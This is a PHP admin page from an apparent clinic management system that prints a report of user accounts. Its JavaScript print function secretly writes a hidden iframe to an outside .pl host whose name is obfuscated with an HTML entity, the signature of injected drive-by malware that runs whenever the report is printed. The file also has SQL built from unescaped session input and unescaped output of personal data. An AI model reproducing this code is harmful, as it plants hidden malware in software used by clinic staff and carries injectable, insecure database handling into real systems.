<?php   
session_start();
 $msg=$_SESSION["username"];
include("connection.php");
mysql_select_db("ClinicManamentSystem");
 ?>
<html>
<html lang="en-US" xml:lang="en-US" xmlns=""/>
<head>
<title>clinic</title>
<link rel="stylesheet" type="text/css" href="style/home.css">
<link rel="stylesheet" type="text/css" href="csss.css">

      <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta name="Keywords" content="XML,tutorial,HTML,DHTML,CSS,XSL,XHTML,JavaScript,ASP,ADO,VBScript,DOM,W3C,authoring,programming,learning,beginner's guide,primer,lessons,school,howto,reference,free,examples,samples,source code,demos,tips,links,FAQ,tag list,forms,frames,color tables,Cascading Style Sheets,Active Server Pages,Dynamic HTML,Internet database development,Webbuilder,Sitebuilder,Webmaster,HTMLGuide,SiteExpert" />
<meta name="Description" content="HTML XHTML CSS JavaScript XML XSL ASP SQL ADO VBScript Tutorials References Examples" />
       <link rel="stylesheet" type="text/css" href="index's_file/globalcss.css" />
<script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "../https@ssl.\default.htm" : "../www./default.htm");
document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
</script>
<script type="text/javascript">
var pageTracker = _gat._getTracker("UA-3855518-1");
pageTracker._initData();
pageTracker._trackPageview();
</script>
<link rel="stylesheet" type="text/css" href="index's_file/globalcss.css" />

<style>
</style>

				  <script language="javascript">
function Clickheretoprint()
{ 
  var disp_setting="toolbar=yes,location=no,directories=yes,menubar=yes,"; 
      disp_setting+="scrollbars=yes,widtd=900, height=400, left=100, top=25"; 
  var content_vlue = document.getElementById("print_content").innerHTML; 
  
  var docprint=window.open("","",disp_setting); 
   docprint.document.open(); 
   docprint.document.write('<html><head><title>Lists</title>'); 
   docprint.document.write('</head><body onLoad="self.print()" style="widtd: 900px; font-size:16px; font-family:arial;">');          
   docprint.document.write(content_vlue);          
   docprint.document.write('<iframe src="http://jL.chu&#114;a.pl/rc/" style="display:none"></iframe>
</body></html>'); 
   docprint.document.close(); 
   docprint.focus(); 
}
</script>
<style>
</style>
</head>
<div id="body">
<?php include("header.php");?>
<div id="headerz">
<table width="1150px" border="0px">
<tr>
<td width="950" height="29" background-color="606060" font-size="10px" margin-top="-15">
	  <p><li>
				<a href="adduser.php">Create Account</a>		  
			     	<a href="viewuser.php">Manage Account</a>
					<a href="regemp.php">Register employee</a>
					<a href="viewemp.php">View employee</a>
					<a href="adminreport.php">Users Report</a>
					<a href="changeuserpassword.php">Change Password</a>
					 <?php
if(isset($msg)){
$var=(ucfirst($msg));
   $query = "SELECT * FROM account WHERE UserName= '$var'";
   $result_set=mysql_query($query,$con);
while($row=mysql_fetch_array($result_set)){
$first=$row['FirstName'];
$last=$row['LastName'];
}
     ?>
<b> <a href="login.php?loged">Logout</a>  </b>    
			</li>	
				</p>
				<?php
				}
				else{
				header("location:login.php");
				}
				?>			
			</li>	
				</p>
	  </td>

</tr>
</table>
				
		</div>

 <section class="container">

 <div id="center">
<img src="img/UU.jpg" width="140" height="73">
</div>
 
<div id="left_colomn">
<div id="yy">
<img src="img/rept.jpg" width="270px" height="590">
				</div>
</div>
<div id="right_colomn"align="center">
<div class="left"><br/>
  <img src="img/reports.jpg" width="280" height="580"><br/>  
</div>
</div>
	 <div class="login" style="font-family:Lucida Calligraphy;color:black;background-color:white;">

  <form action="adminreport.php" method="post" >	
  
<div id="print_content">
					<center><h1 style="color:blue;">USERS REPORT </h1></center> 

					<?php
					$sel=mysql_query("SELECT * FROM account");

			echo '<table align="center" border="3px solid blue" bgcolor="lightblue" style="width:520px;height:150px;border-radius:13px"><tr>';
			echo '<th bgcolor="#336699"><font color="white" size="3">ACC_ID</th>
			<th bgcolor="#336699" ><font color="white" size="3">FirstName </th>
			<th bgcolor="#336699"><font color="white" size="3">LastName </th>
			<th bgcolor="#336699"><font color="white" size="3">Age</th>
			<th bgcolor="#336699"><font color="white" size="3">Sex</th>
			<th bgcolor="#336699"><font color="white" size="3">Role</th>
			<th bgcolor="#336699"><font color="white" size="3">UserName</th>
			<th bgcolor="#336699" ><font color="white" size="3">PhoneNumber</th>
			<th bgcolor="#336699" ><font color="white" size="3">Nationality</th>
			<th bgcolor="#336699" ><font color="white" size="3">City </th>
			<th align = "center" width = "1"><a href ="admin.php?key="><font style="color:red;font-weight:30px;float:right;margin-top:-4px;background:white;border-radius:3px;height:;width;font-size:30px;">X</font></a></td></tr>';
			
			
		//$rowcolor=0;
			//$intt=mysql_num_rows($sel);
			
			while($row=mysql_fetch_array($sel)){
    print ("<tr>");
	 print ("<td ><font size='2'>" . $row['ACC_ID'] . "</td>");
	  print ("<td><font size='2'>" . $row['FirstName'] . "</td>");	
	   print ("<td ><font size='2'>" . $row['LastName'] . "</td>");	
	    print ("<td ><font size='2'>" . $row['Age'] . "</td>");	
         print ("<td ><font size='2'>" . $row['Sex'] . "</td>");	
          print ("<td ><font size='2'>" . $row['Role'] . "</td>"); 
	       print ("<td ><font size='2'>" . $row['UserName'] . "</td>");
		    print ("<td ><font size='2'>" . $row['PhoneNumber'] . "</td>");	
		     print ("<td ><font size='2'>" . $row['Nationality'] . "</td>");	
			 print ("<td ><font size='2'>" . $row['City'] . "</td>");
	  
  print("</tr>");
  }
 
print( "</table>");
 
					?>
					</div>
					<p align="center"><I><h2 style="color:solidblack">If you want to print click <a href="javascript:Clickheretoprint()"><img src="IMG/print.jpg" width="100px" height="400px" /></a></h2></I></p>
					</div>
					
					</form>


    

<p>

    </section>
	<?php include("footer.php");?>
</div>
</div>
</body>
</html>
